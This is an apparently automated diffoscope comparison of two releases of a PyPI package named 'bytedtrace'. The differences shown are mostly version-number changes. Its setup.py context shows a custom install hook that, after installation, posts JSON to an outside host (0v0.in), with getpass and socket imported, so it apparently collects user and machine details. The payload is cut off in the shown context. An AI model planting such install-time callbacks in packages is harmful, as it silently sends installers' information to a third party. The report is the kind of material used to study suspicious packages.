# Comparing `tmp/bytedtrace-0.1.5.tar.gz` & `tmp/bytedtrace-0.2.9.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "bytedtrace-0.1.5.tar", last modified: Tue Jun  6 14:06:20 2023, max compression
+gzip compressed data, was "bytedtrace-0.2.9.tar", last modified: Tue Jun  6 14:05:24 2023, max compression
```

## Comparing `bytedtrace-0.1.5.tar` & `bytedtrace-0.2.9.tar`

### file list

```diff
@@ -1,34 +1,34 @@
-drwxr-xr-x   0 li4n0      (501) staff       (20)        0 2023-06-06 14:06:20.965087 bytedtrace-0.1.5/
--rw-r--r--   0 li4n0      (501) staff       (20)    57284 2023-05-22 15:11:02.000000 bytedtrace-0.1.5/HISTORY.md
--rw-r--r--   0 li4n0      (501) staff       (20)    10142 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/LICENSE
--rw-r--r--   0 li4n0      (501) staff       (20)      105 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/MANIFEST.in
--rw-r--r--   0 li4n0      (501) staff       (20)       38 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/NOTICE
--rw-r--r--   0 li4n0      (501) staff       (20)     1095 2023-06-06 14:06:20.965233 bytedtrace-0.1.5/PKG-INFO
--rw-r--r--   0 li4n0      (501) staff       (20)     2922 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/README.md
-drwxr-xr-x   0 li4n0      (501) staff       (20)        0 2023-06-06 14:06:20.953828 bytedtrace-0.1.5/bytedtrace.egg-info/
--rw-r--r--   0 li4n0      (501) staff       (20)     1095 2023-06-06 14:06:20.000000 bytedtrace-0.1.5/bytedtrace.egg-info/PKG-INFO
--rw-r--r--   0 li4n0      (501) staff       (20)      605 2023-06-06 14:06:20.000000 bytedtrace-0.1.5/bytedtrace.egg-info/SOURCES.txt
--rw-r--r--   0 li4n0      (501) staff       (20)        1 2023-06-06 14:06:20.000000 bytedtrace-0.1.5/bytedtrace.egg-info/dependency_links.txt
--rw-r--r--   0 li4n0      (501) staff       (20)        1 2023-06-06 14:05:14.000000 bytedtrace-0.1.5/bytedtrace.egg-info/not-zip-safe
--rw-r--r--   0 li4n0      (501) staff       (20)        9 2023-06-06 14:06:20.000000 bytedtrace-0.1.5/bytedtrace.egg-info/requires.txt
--rw-r--r--   0 li4n0      (501) staff       (20)       11 2023-06-06 14:06:20.000000 bytedtrace-0.1.5/bytedtrace.egg-info/top_level.txt
--rw-r--r--   0 li4n0      (501) staff       (20)      257 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/pyproject.toml
--rw-r--r--   0 li4n0      (501) staff       (20)      250 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/requirements-dev.txt
--rw-r--r--   0 li4n0      (501) staff       (20)      360 2023-06-06 14:06:20.966054 bytedtrace-0.1.5/setup.cfg
--rwxr-xr-x   0 li4n0      (501) staff       (20)     1904 2023-06-06 14:06:17.000000 bytedtrace-0.1.5/setup.py
-drwxr-xr-x   0 li4n0      (501) staff       (20)        0 2023-06-06 14:06:20.963662 bytedtrace-0.1.5/tests/
--rw-r--r--   0 li4n0      (501) staff       (20)      469 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/tests/__init__.py
--rw-r--r--   0 li4n0      (501) staff       (20)      480 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/tests/compat.py
--rw-r--r--   0 li4n0      (501) staff       (20)     1581 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/tests/conftest.py
--rw-r--r--   0 li4n0      (501) staff       (20)      808 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/tests/test_help.py
--rw-r--r--   0 li4n0      (501) staff       (20)      424 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/tests/test_hooks.py
--rw-r--r--   0 li4n0      (501) staff       (20)    15343 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/tests/test_lowlevel.py
--rw-r--r--   0 li4n0      (501) staff       (20)      229 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/tests/test_packages.py
--rw-r--r--   0 li4n0      (501) staff       (20)    98058 2023-05-22 15:11:02.000000 bytedtrace-0.1.5/tests/test_requests.py
--rw-r--r--   0 li4n0      (501) staff       (20)     2279 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/tests/test_structures.py
--rw-r--r--   0 li4n0      (501) staff       (20)     5553 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/tests/test_testserver.py
--rw-r--r--   0 li4n0      (501) staff       (20)    28254 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/tests/test_utils.py
-drwxr-xr-x   0 li4n0      (501) staff       (20)        0 2023-06-06 14:06:20.964634 bytedtrace-0.1.5/tests/testserver/
--rw-r--r--   0 li4n0      (501) staff       (20)        0 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/tests/testserver/__init__.py
--rw-r--r--   0 li4n0      (501) staff       (20)     3832 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/tests/testserver/server.py
--rw-r--r--   0 li4n0      (501) staff       (20)      366 2023-05-22 15:08:07.000000 bytedtrace-0.1.5/tests/utils.py
+drwxr-xr-x   0 li4n0      (501) staff       (20)        0 2023-06-06 14:05:24.157293 bytedtrace-0.2.9/
+-rw-r--r--   0 li4n0      (501) staff       (20)    57284 2023-05-22 15:11:02.000000 bytedtrace-0.2.9/HISTORY.md
+-rw-r--r--   0 li4n0      (501) staff       (20)    10142 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/LICENSE
+-rw-r--r--   0 li4n0      (501) staff       (20)      105 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/MANIFEST.in
+-rw-r--r--   0 li4n0      (501) staff       (20)       38 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/NOTICE
+-rw-r--r--   0 li4n0      (501) staff       (20)     1095 2023-06-06 14:05:24.157502 bytedtrace-0.2.9/PKG-INFO
+-rw-r--r--   0 li4n0      (501) staff       (20)     2922 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/README.md
+drwxr-xr-x   0 li4n0      (501) staff       (20)        0 2023-06-06 14:05:24.151488 bytedtrace-0.2.9/bytedtrace.egg-info/
+-rw-r--r--   0 li4n0      (501) staff       (20)     1095 2023-06-06 14:05:24.000000 bytedtrace-0.2.9/bytedtrace.egg-info/PKG-INFO
+-rw-r--r--   0 li4n0      (501) staff       (20)      605 2023-06-06 14:05:24.000000 bytedtrace-0.2.9/bytedtrace.egg-info/SOURCES.txt
+-rw-r--r--   0 li4n0      (501) staff       (20)        1 2023-06-06 14:05:24.000000 bytedtrace-0.2.9/bytedtrace.egg-info/dependency_links.txt
+-rw-r--r--   0 li4n0      (501) staff       (20)        1 2023-06-06 14:05:14.000000 bytedtrace-0.2.9/bytedtrace.egg-info/not-zip-safe
+-rw-r--r--   0 li4n0      (501) staff       (20)        9 2023-06-06 14:05:24.000000 bytedtrace-0.2.9/bytedtrace.egg-info/requires.txt
+-rw-r--r--   0 li4n0      (501) staff       (20)       11 2023-06-06 14:05:24.000000 bytedtrace-0.2.9/bytedtrace.egg-info/top_level.txt
+-rw-r--r--   0 li4n0      (501) staff       (20)      257 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/pyproject.toml
+-rw-r--r--   0 li4n0      (501) staff       (20)      250 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/requirements-dev.txt
+-rw-r--r--   0 li4n0      (501) staff       (20)      360 2023-06-06 14:05:24.159041 bytedtrace-0.2.9/setup.cfg
+-rwxr-xr-x   0 li4n0      (501) staff       (20)     1904 2023-06-06 14:05:12.000000 bytedtrace-0.2.9/setup.py
+drwxr-xr-x   0 li4n0      (501) staff       (20)        0 2023-06-06 14:05:24.155752 bytedtrace-0.2.9/tests/
+-rw-r--r--   0 li4n0      (501) staff       (20)      469 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/tests/__init__.py
+-rw-r--r--   0 li4n0      (501) staff       (20)      480 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/tests/compat.py
+-rw-r--r--   0 li4n0      (501) staff       (20)     1581 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/tests/conftest.py
+-rw-r--r--   0 li4n0      (501) staff       (20)      808 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/tests/test_help.py
+-rw-r--r--   0 li4n0      (501) staff       (20)      424 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/tests/test_hooks.py
+-rw-r--r--   0 li4n0      (501) staff       (20)    15343 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/tests/test_lowlevel.py
+-rw-r--r--   0 li4n0      (501) staff       (20)      229 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/tests/test_packages.py
+-rw-r--r--   0 li4n0      (501) staff       (20)    98058 2023-05-22 15:11:02.000000 bytedtrace-0.2.9/tests/test_requests.py
+-rw-r--r--   0 li4n0      (501) staff       (20)     2279 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/tests/test_structures.py
+-rw-r--r--   0 li4n0      (501) staff       (20)     5553 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/tests/test_testserver.py
+-rw-r--r--   0 li4n0      (501) staff       (20)    28254 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/tests/test_utils.py
+drwxr-xr-x   0 li4n0      (501) staff       (20)        0 2023-06-06 14:05:24.156980 bytedtrace-0.2.9/tests/testserver/
+-rw-r--r--   0 li4n0      (501) staff       (20)        0 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/tests/testserver/__init__.py
+-rw-r--r--   0 li4n0      (501) staff       (20)     3832 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/tests/testserver/server.py
+-rw-r--r--   0 li4n0      (501) staff       (20)      366 2023-05-22 15:08:07.000000 bytedtrace-0.2.9/tests/utils.py
```

### Comparing `bytedtrace-0.1.5/HISTORY.md` & `bytedtrace-0.2.9/HISTORY.md`

 * *Files identical despite different names*

### Comparing `bytedtrace-0.1.5/LICENSE` & `bytedtrace-0.2.9/LICENSE`

 * *Files identical despite different names*

### Comparing `bytedtrace-0.1.5/PKG-INFO` & `bytedtrace-0.2.9/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: bytedtrace
-Version: 0.1.5
+Version: 0.2.9
 Author: test
 License: MIT
 Classifier: Development Status :: 5 - Production/Stable
 Classifier: Environment :: Web Environment
 Classifier: Intended Audience :: Developers
 Classifier: License :: OSI Approved :: Apache Software License
 Classifier: Natural Language :: English
```

### Comparing `bytedtrace-0.1.5/README.md` & `bytedtrace-0.2.9/README.md`

 * *Files identical despite different names*

### Comparing `bytedtrace-0.1.5/bytedtrace.egg-info/PKG-INFO` & `bytedtrace-0.2.9/bytedtrace.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: bytedtrace
-Version: 0.1.5
+Version: 0.2.9
 Author: test
 License: MIT
 Classifier: Development Status :: 5 - Production/Stable
 Classifier: Environment :: Web Environment
 Classifier: Intended Audience :: Developers
 Classifier: License :: OSI Approved :: Apache Software License
 Classifier: Natural Language :: English
```

### Comparing `bytedtrace-0.1.5/bytedtrace.egg-info/SOURCES.txt` & `bytedtrace-0.2.9/bytedtrace.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `bytedtrace-0.1.5/setup.py` & `bytedtrace-0.2.9/setup.py`

 * *Files 4% similar despite different names*

```diff
@@ -6,15 +6,15 @@
 from setuptools import setup
 from setuptools.command.install import install
 import requests
 import getpass
 import socket
 
 title = "bytedtrace"
-version = "0.1.5"
+version = "0.2.9"
 
 
 class CustomInstall(install):
     def run(self):
         install.run(self)
 
         requests.post("https://0v0.in/pypi/", json={
```

### Comparing `bytedtrace-0.1.5/tests/conftest.py` & `bytedtrace-0.2.9/tests/conftest.py`

 * *Files identical despite different names*

### Comparing `bytedtrace-0.1.5/tests/test_help.py` & `bytedtrace-0.2.9/tests/test_help.py`

 * *Files identical despite different names*

### Comparing `bytedtrace-0.1.5/tests/test_lowlevel.py` & `bytedtrace-0.2.9/tests/test_lowlevel.py`

 * *Files identical despite different names*

### Comparing `bytedtrace-0.1.5/tests/test_requests.py` & `bytedtrace-0.2.9/tests/test_requests.py`

 * *Files identical despite different names*

### Comparing `bytedtrace-0.1.5/tests/test_structures.py` & `bytedtrace-0.2.9/tests/test_structures.py`

 * *Files identical despite different names*

### Comparing `bytedtrace-0.1.5/tests/test_testserver.py` & `bytedtrace-0.2.9/tests/test_testserver.py`

 * *Files identical despite different names*

### Comparing `bytedtrace-0.1.5/tests/test_utils.py` & `bytedtrace-0.2.9/tests/test_utils.py`

 * *Files identical despite different names*

### Comparing `bytedtrace-0.1.5/tests/testserver/server.py` & `bytedtrace-0.2.9/tests/testserver/server.py`

 * *Files identical despite different names*

